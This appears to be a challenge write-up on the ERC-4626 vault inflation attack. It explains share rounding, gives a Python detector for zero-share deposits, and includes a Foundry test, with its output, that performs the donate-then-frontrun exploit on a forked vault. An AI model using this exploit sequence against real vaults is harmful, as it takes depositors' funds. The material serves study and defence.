# Vault - Tier 1
You are looking through an old version of the OpenZeppelin implementation of ERC-4626 and notice a vulnerability that requires frontrunning an innocent user. You have been granted a large amount of ETH (say e.g. 1k ETH, but you are free to choose the amount :) ) and want to set up a whitehat bot to execute this exploit and return the funds to the user.


- a) Describe the vulnerability and the payoffs for an attacker.

The key issue in the ERC-4626 tokenized vault standard is a vulnerability that comes from how shares are calculated when assets are deposited. Specifically, the formula relies on the asset.balanceOf(address(this)) as the denominator, and can be manipulated (frontrunned) by a potential attacker, by making a transfer to the vault contract right before the legitimate transaction to deposit on the Vault

``` sharesAmount = totalShares * assetAmount / asset.balanceOf(address(this)) ```

Depending on the implementation an protection mechanisms in place, the potential vulnerability might differ: 
1.  A vault might be vulnerable to a total loss of funds to the user, going directly to the attacker, if the vault doesn't implement any protection, by achieving rounding the shares of the depositor to 0.
2.  A vault might be vulnerable to a partial loss of funds if there is protection, by rounding the shares of the depositor to 1
3. A vault might have proper protection in place by having dead shares, which make impossible to the attacker to make a profit and extremely expensive to make a griefing attack.

The payoffs for the attacker, in 1. are the most important, as he can receive the 100% of the deposit from the innocent user. In 2. he can also ensure a profit. He doesn't take a risk by executing the attack, since he won't be losing funds in any case.

In 3, however, he would have to lose an important quantity just to sabotage the deposit of the user.

For the shake of this exercise, I am assuming the implementation we are looking for is having a vulnerability 1, since that was the case for the old OpenZeppeling implementation of ERC4626

- b)  Produce code that can check if this vulnerability has occurred in the past and determine how much value was lost, if any.

Assuming we are in the first scenario, we can make a simple assumption to see if the attack was previously done, by filtering previous Deposit events on the vault, where the assets deposited are > 0 and the shares received are 0. The attacker could have rounded the shares of the victim to 1 but we will assume the attacker doesn't leave money on the table.

```python
def check_for_attack(events):
    for event in events:
        assets = event['args']['assets']
        shares = event['args']['shares']

        print(f"Assets: {assets}, Shares: {shares}")

        # Check if shares are 0 and assets > 0
        if shares == 0 and assets > 0:
            caller = event['args']['caller']
            owner = event['args']['owner']
            print(f"Potential attack detected! Caller: {caller}, Owner: {owner}, Assets lost: {assets} tokens")
        else:
            print("No attack detected")
```


- c)  Write code for the bot that can carry out the exploit (don’t worry about returning user funds).

A test on foundry was created replicating the full situation, where the victim got out of tokens, and we were able to get access to 100% of their deposit can be found on `./simulations`

```solidity
    function test() public {
        uint256 vaultBalanceStart = weth.balanceOf(address(vault));
        uint256 victimBalanceStart = weth.balanceOf(victim);
        uint256 whitehatBalanceStart = weth.balanceOf(whitehat);

        console2.log("vault balance start", vaultBalanceStart);
        console2.log("victim balance start", victimBalanceStart);
        console2.log("whitehat balance start", whitehatBalanceStart);

        vm.startPrank(whitehat);
        vault.deposit(1, whitehat);

        uint256 vaultBalanceAfterMint = weth.balanceOf(address(vault));

        assertEq(vaultBalanceAfterMint, 1);

        weth.transfer(address(vault), inflationAmount);

        uint256 vaultBalanceAfterTransfer = weth.balanceOf(address(vault));
        uint256 vaultTotalSupplyAfterTransfer = vault.totalSupply();

        console2.log("vault balance after transfer", vaultBalanceAfterTransfer);
        console2.log("vault total supply after transfer", vaultTotalSupplyAfterTransfer);
        console2.log("victim deposit");

        vm.startPrank(victim);
        vault.deposit(victimDeposit, victim);
        
        uint256 victimBalanceAfterDeposit = weth.balanceOf(victim);
        uint256 vaultBalanceAfterDeposit = weth.balanceOf(address(vault));
        uint256 vaultTotalSupplyAfterDeposit = vault.totalSupply();
        uint256 victimShares = vault.balanceOf(victim);
        uint256 whitehatShares = vault.balanceOf(whitehat);

        console2.log("victim balance after deposit", victimBalanceAfterDeposit);
        console2.log("vault balance after deposit", vaultBalanceAfterDeposit);
        console2.log("vault total supply after deposit", vaultTotalSupplyAfterDeposit);
        console2.log("victim shares", victimShares);
        console2.log("whitehat shares", whitehatShares);

        assertEq(victimShares, 0);
        assertEq(whitehatShares, 1);
        assertEq(vaultBalanceAfterDeposit, inflationAmount + victimDeposit + 1);
    }
```

It can be run by going into simulations and running 

`forge test --match-path test/01_ERC_4626.sol --via-ir --fork-url  http://127.0.0.1:8599 -vvv `

```shell
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/01_ERC_4626.sol:VaultTest
[PASS] test() (gas: 158259)
Logs:
  vault balance start 0
  victim balance start 100000000000000000000
  whitehat balance start 100000000000000000000
  deposit
  vault balance after transfer 10000000000000000001
  vault total supply after transfer 1
  victim deposit
  deposit
  victim balance after deposit 90000000000000000000
  vault balance after deposit 20000000000000000001
  vault total supply after deposit 1
  victim shares 0
  whitehat shares 1

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.88ms (2.40ms CPU time)
```